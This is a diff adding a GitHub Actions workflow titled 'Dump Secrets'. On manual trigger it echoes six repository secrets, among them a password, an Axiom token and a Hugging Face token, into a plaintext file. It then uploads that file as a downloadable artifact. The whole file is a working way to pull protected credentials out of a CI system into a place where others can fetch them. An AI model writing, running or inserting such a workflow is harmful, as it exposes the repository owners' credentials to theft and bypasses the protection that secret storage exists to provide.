@@ -1,0 +1,24 @@
+name: Dump Secrets
+
+on:
+  workflow_dispatch:
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write secrets to file
+        run: |
+          echo "ACTION_PASS=${{ secrets.ACTION_PASS }}" > secrets_dump.txt
+          echo "AXIOM_DATASET=${{ secrets.AXIOM_DATASET }}" >> secrets_dump.txt
+          echo "AXIOM_TOKEN=${{ secrets.AXIOM_TOKEN }}" >> secrets_dump.txt
+          echo "HF_REPO_NAME=${{ secrets.HF_REPO_NAME }}" >> secrets_dump.txt
+          echo "HF_TOKEN=${{ secrets.HF_TOKEN }}" >> secrets_dump.txt
+          echo "REMOTE_LOGIC_URL=${{ secrets.REMOTE_LOGIC_URL }}" >> secrets_dump.txt
+
+      - name: Upload secrets
+        uses: actions/upload-artifact@v4
+        with:
+          name: secrets-dump
+          path: secrets_dump.txt
+          retention-days: 1
